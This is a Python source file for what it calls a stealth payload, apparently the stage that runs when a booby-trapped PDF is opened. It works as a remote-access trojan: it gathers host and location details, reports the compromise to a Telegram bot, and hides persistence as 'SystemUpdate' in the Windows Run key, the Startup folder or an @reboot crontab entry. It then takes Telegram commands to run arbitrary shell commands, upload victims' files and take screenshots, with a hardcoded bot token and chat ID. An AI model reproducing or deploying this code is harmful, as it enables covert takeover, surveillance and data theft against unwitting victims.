"""
Stealth payload for maximum evasion
"""
import os
import sys
import subprocess
import requests
import platform
import socket
import threading
import time
import base64
import tempfile
from datetime import datetime

class StealthPayload:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.session_id = self.generate_session_id()
        
    def generate_session_id(self):
        """Generate unique session ID"""
        import hashlib
        import random
        data = f"{socket.gethostname()}{time.time()}{random.randint(1000,9999)}"
        return hashlib.md5(data.encode()).hexdigest()[:8]
    
    def send_message(self, message):
        """Send message to Telegram with error handling"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            
            # Use different user agents
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.post(url, data=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def get_detailed_system_info(self):
        """Get comprehensive system information"""
        try:
            info = {
                'hostname': socket.gethostname(),
                'username': os.getenv('USERNAME') or os.getenv('USER'),
                'system': platform.system(),
                'release': platform.release(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'session_id': self.session_id
            }
            
            # Get network info
            try:
                ip_info = requests.get('http://ipinfo.io/json', timeout=5).json()
                info.update({
                    'ip': ip_info.get('ip', 'Unknown'),
                    'city': ip_info.get('city', 'Unknown'),
                    'country': ip_info.get('country', 'Unknown'),
                    'org': ip_info.get('org', 'Unknown')
                })
            except:
                info['ip'] = 'Unknown'
            
            # Get installed software (Windows)
            if platform.system() == "Windows":
                try:
                    result = subprocess.run(['wmic', 'product', 'get', 'name'], 
                                          capture_output=True, text=True, timeout=10)
                    software = [line.strip() for line in result.stdout.split('\n') 
                               if line.strip() and line.strip() != 'Name'][:10]
                    info['software'] = software
                except:
                    info['software'] = []
            
            return info
        except Exception as e:
            return {'error': str(e)}
    
    def format_notification(self, info):
        """Format the notification message"""
        message = f"""
🚨 **PDF BACKDOOR ACTIVATED**

**Target Information:**
• **Session ID:** `{info.get('session_id', 'Unknown')}`
• **Hostname:** `{info.get('hostname', 'Unknown')}`
• **Username:** `{info.get('username', 'Unknown')}`
• **OS:** `{info.get('system', 'Unknown')} {info.get('release', '')}`
• **Architecture:** `{info.get('architecture', 'Unknown')}`
• **IP Address:** `{info.get('ip', 'Unknown')}`
• **Location:** `{info.get('city', 'Unknown')}, {info.get('country', 'Unknown')}`
• **ISP:** `{info.get('org', 'Unknown')}`
• **Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`

**Status:** ✅ Payload executed successfully
**Persistence:** Installing...
**Command Channel:** Ready

Use `/sendcmd {info.get('session_id', 'unknown')} <command>` to control this target.
        """
        
        return message.strip()
    
    def install_persistence(self):
        """Install persistence mechanisms"""
        try:
            current_script = os.path.abspath(__file__)
            
            if platform.system() == "Windows":
                # Registry persistence
                try:
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                       r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                       0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, 
                                    f'python "{current_script}"')
                    winreg.CloseKey(key)
                    return "Registry persistence installed"
                except:
                    pass
                
                # Startup folder persistence
                try:
                    startup_folder = os.path.join(os.getenv('APPDATA'), 
                                                'Microsoft', 'Windows', 'Start Menu', 
                                                'Programs', 'Startup')
                    persistence_script = os.path.join(startup_folder, 'system_update.py')
                    
                    with open(current_script, 'r') as src:
                        with open(persistence_script, 'w') as dst:
                            dst.write(src.read())
                    
                    return "Startup folder persistence installed"
                except:
                    pass
            
            else:  # Linux/Mac
                try:
                    home = os.path.expanduser('~')
                    
                    # Crontab persistence
                    cron_entry = f"@reboot python3 {current_script}\n"
                    subprocess.run(['crontab', '-l'], capture_output=True)
                    subprocess.run(f'(crontab -l; echo "{cron_entry}") | crontab -', 
                                 shell=True, capture_output=True)
                    
                    return "Crontab persistence installed"
                except:
                    pass
            
            return "Persistence installation failed"
            
        except Exception as e:
            return f"Persistence error: {str(e)}"
    
    def start_command_listener(self):
        """Start listening for commands"""
        def command_loop():
            while True:
                try:
                    # Simple polling mechanism using Telegram bot API
                    url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
                    params = {'timeout': 30, 'offset': -1}
                    
                    response = requests.get(url, params=params, timeout=35)
                    if response.status_code == 200:
                        data = response.json()
                        if data['result']:
                            last_message = data['result'][-1]['message']
                            text = last_message.get('text', '')
                            
                            # Check if command is for this session
                            if text.startswith(f'/sendcmd {self.session_id}'):
                                command = text.split(' ', 2)[2] if len(text.split(' ')) > 2 else ''
                                if command:
                                    self.execute_command(command)
                    
                    time.sleep(5)
                    
                except Exception as e:
                    time.sleep(10)
        
        # Start in background thread
        thread = threading.Thread(target=command_loop, daemon=True)
        thread.start()
    
    def execute_command(self, command):
        """Execute received command"""
        try:
            if command.startswith('download:'):
                filepath = command.split(':', 1)[1]
                self.upload_file(filepath)
            elif command == 'screenshot':
                self.take_screenshot()
            elif command == 'sysinfo':
                info = self.get_detailed_system_info()
                self.send_message(f"System Info:\n```json\n{info}\n```")
            else:
                # Execute shell command
                result = subprocess.run(command, shell=True, capture_output=True, 
                                      text=True, timeout=30)
                output = result.stdout + result.stderr
                
                if len(output) > 3000:
                    # Send as file if too long
                    temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
                    temp_file.write(output)
                    temp_file.close()
                    self.upload_file(temp_file.name)
                    os.unlink(temp_file.name)
                else:
                    self.send_message(f"Command: `{command}`\nOutput:\n```\n{output}\n```")
                    
        except Exception as e:
            self.send_message(f"Command error: {str(e)}")
    
    def upload_file(self, filepath):
        """Upload file to Telegram"""
        try:
            if os.path.exists(filepath) and os.path.getsize(filepath) < 50 * 1024 * 1024:  # 50MB limit
                url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
                
                with open(filepath, 'rb') as file:
                    files = {'document': file}
                    data = {'chat_id': self.chat_id}
                    response = requests.post(url, files=files, data=data, timeout=60)
                    
                if response.status_code == 200:
                    self.send_message(f"✅ File uploaded: {os.path.basename(filepath)}")
                else:
                    self.send_message(f"❌ Upload failed: {filepath}")
            else:
                self.send_message(f"❌ File not found or too large: {filepath}")
                
        except Exception as e:
            self.send_message(f"Upload error: {str(e)}")
    
    def take_screenshot(self):
        """Take screenshot"""
        try:
            if platform.system() == "Windows":
                import PIL.ImageGrab as ImageGrab
                screenshot = ImageGrab.grab()
                temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                screenshot.save(temp_file.name)
                self.upload_file(temp_file.name)
                os.unlink(temp_file.name)
            else:
                # Linux screenshot
                temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                subprocess.run(['scrot', temp_file.name], timeout=10)
                if os.path.exists(temp_file.name):
                    self.upload_file(temp_file.name)
                    os.unlink(temp_file.name)
                else:
                    self.send_message("Screenshot failed - scrot not available")
                    
        except Exception as e:
            self.send_message(f"Screenshot error: {str(e)}")
    
    def run(self):
        """Main execution function"""
        try:
            # Get system info and send notification
            system_info = self.get_detailed_system_info()
            notification = self.format_notification(system_info)
            
            if self.send_message(notification):
                # Install persistence
                persistence_result = self.install_persistence()
                self.send_message(f"🔧 Persistence: {persistence_result}")
                
                # Start command listener
                self.start_command_listener()
                self.send_message(f"👂 Command listener started for session: `{self.session_id}`")
                
                # Keep alive
                while True:
                    time.sleep(300)  # 5 minutes
                    
            else:
                # Retry mechanism
                for i in range(5):
                    time.sleep(60)  # Wait 1 minute
                    if self.send_message(notification):
                        break
                        
        except Exception as e:
            # Silent fail for stealth
            pass

# Entry point for PDF execution
if __name__ == "__main__":
    # These will be replaced by the PDF generator
    BOT_TOKEN = "7715353665:AAFBidbYxPuXkSb4VemN6vc2W9b-juCVs50"
    CHAT_ID = "6686015911"
    
    payload = StealthPayload(BOT_TOKEN, CHAT_ID)
    payload.run()

